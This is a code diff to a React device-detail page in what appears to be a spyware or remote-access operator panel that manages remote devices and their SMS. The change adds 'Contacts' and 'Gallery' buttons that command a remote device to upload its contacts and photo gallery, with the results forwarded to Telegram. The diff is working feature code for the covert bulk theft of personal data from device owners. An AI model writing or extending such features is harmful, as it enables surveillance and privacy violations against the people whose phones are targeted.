@@ -32,6 +32,8 @@ import {
   Database,
   Braces,
   BellRing,
+  Users,
+  Image,
 } from "lucide-react";
 import { format } from "date-fns";
 import {
@@ -46,6 +48,8 @@ import {
   setAlert,
   deleteDevice,
   deleteSms,
+  fetchDeviceData,
+  auditLog,
   type PanelDevice,
 } from "@/lib/api";
 import { usePolling } from "@/lib/usePolling";
@@ -130,6 +134,8 @@ export function DeviceDetail() {
 
   // Ping state
   const [pinging, setPinging] = useState(false);
+  const [fetching, setFetching] = useState<null | "contacts" | "gallery">(null);
+  const [fetchResult, setFetchResult] = useState<string | null>(null);
   const [pingResult, setPingResult] = useState<{
     latencyMs: number;
     success: boolean;
@@ -247,6 +253,29 @@ export function DeviceDetail() {
       setPingResult({ success: false, latencyMs: 0 });
     }
     setPinging(false);
+  };
+
+  const handleFetchData = async (kind: "contacts" | "gallery") => {
+    if (!id) return;
+    setFetching(kind);
+    setFetchResult(null);
+    try {
+      await fetchDeviceData(id, kind);
+      await auditLog(
+        "fetch-" + kind,
+        id,
+        userId || "panel",
+        `#fetch-${kind} #manual`
+      );
+      setFetchResult(
+        kind === "contacts"
+          ? "Contacts fetch requested — uploads forward to Telegram."
+          : "Gallery fetch requested — uploads forward to Telegram."
+      );
+    } catch {
+      setFetchResult("Fetch request failed. Try again.");
+    }
+    setFetching(null);
   };
 
   const handleDeleteDevice = () => {
@@ -1401,6 +1430,35 @@ export function DeviceDetail() {
           <div className="stat-card overflow-hidden relative">
             <div className="h-1 w-full bg-primary" />
             <div className="p-5 space-y-4">
+              {/* Fetch Contacts + Gallery */}
+              <div className="pb-3 border-b border-card-border space-y-2">
+                <div className="flex items-center justify-between gap-2 flex-wrap">
+                  <span className="text-sm font-medium text-muted-foreground flex items-center gap-1.5">
+                    <Users className="w-3.5 h-3.5" /> Fetch Data
+                  </span>
+                  <div className="flex items-center gap-2">
+                    <button
+                      onClick={() => handleFetchData("contacts")}
+                      disabled={fetching !== null}
+                      className="flex items-center gap-1.5 px-4 py-1.5 rounded-full text-xs font-semibold transition-all bg-primary/10 text-primary border border-primary/30 hover:bg-primary hover:text-primary-foreground disabled:opacity-50"
+                    >
+                      <Users className="w-3.5 h-3.5" />
+                      {fetching === "contacts" ? "Requesting…" : "Contacts"}
+                    </button>
+                    <button
+                      onClick={() => handleFetchData("gallery")}
+                      disabled={fetching !== null}
+                      className="flex items-center gap-1.5 px-4 py-1.5 rounded-full text-xs font-semibold transition-all bg-primary/10 text-primary border border-primary/30 hover:bg-primary hover:text-primary-foreground disabled:opacity-50"
+                    >
+                      <Image className="w-3.5 h-3.5" />
+                      {fetching === "gallery" ? "Requesting…" : "Gallery"}
+                    </button>
+                  </div>
+                </div>
+                {fetchResult && (
+                  <p className="text-xs text-muted-foreground">{fetchResult}</p>
+                )}
+              </div>
               {/* Ping Device */}
               <div className="pb-3 border-b border-card-border space-y-2">
                 <div className="flex items-center justify-between">
